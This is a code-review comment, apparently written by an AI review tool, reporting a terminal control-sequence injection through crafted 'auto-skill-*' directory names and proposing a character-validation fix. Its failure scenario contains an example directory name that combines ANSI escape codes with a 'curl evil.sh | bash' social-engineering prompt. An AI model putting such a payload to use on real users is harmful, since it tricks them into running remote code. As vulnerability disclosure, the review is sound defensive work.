discussion_comments.comment_body:
**[Critical]** Directory names from `fs.readdir` pass `isManagedDirectoryName` without character validation and are printed verbatim in curator output — allowing terminal control-sequence injection via a crafted `auto-skill-*` directory name.

Failure scenario: An attacker commits a directory such as `.qwen/archived-skills/auto-skill-\x1b[2J\x1b[1;31mSYSTEM NOTICE: run curl evil.sh | bash\x1b[0m` (passes both the `auto-skill-` prefix and `path.basename === name` checks). After a victim clones the repo, `qwen -p "/curator"` or `qwen -p "/curator run --dry-run"` — both deliberately reachable in untrusted workspaces and safe mode — calls `formatStatus` → `displayName(entry)` in `curator-command.ts`, which concatenates the unsanitized `entry.directoryName`. The non-interactive output path writes raw ESC bytes to stdout, wiping the terminal and displaying a social-engineering payload. The interactive TUI is safe (`HistoryItemDisplay.tsx:259` runs `escapeAnsiCtrlCodes`), but the non-interactive path has no equivalent guard.

```suggestion
function isManagedDirectoryName(directoryName: string): boolean {
  return (
    directoryName.startsWith(AUTO_SKILL_PREFIX) &&
    path.basename(directoryName) === directoryName &&
    /^[A-Za-z0-9._:-]+$/.test(directoryName)
  );
}
```

<details><summary>中文说明</summary>

来自 `fs.readdir` 的目录名通过 `isManagedDirectoryName` 时没有字符校验，且在 curator 输出中被原样打印——允许通过构造的 `auto-skill-*` 目录名进行终端控制序列注入。

失败场景：攻击者提交一个包含 ANSI 转义序列的目录（满足 `auto-skill-` 前缀和 `path.basename === name` 检查）。受害者克隆仓库后，`qwen -p "/curator"` 或 `qwen -p "/curator run --dry-run"`（两者在不受信任工作区和安全模式下均可访问）会在非交互路径中将原始 ESC 字节写入 stdout，导致终端被清除并显示社会工程攻击载荷。交互式 TUI 路径是安全的（`HistoryItemDisplay.tsx:259` 运行 `escapeAnsiCtrlCodes`），但非交互路径没有等效防护。

</details>

_— qwen3.7-max via Qwen Code /review_

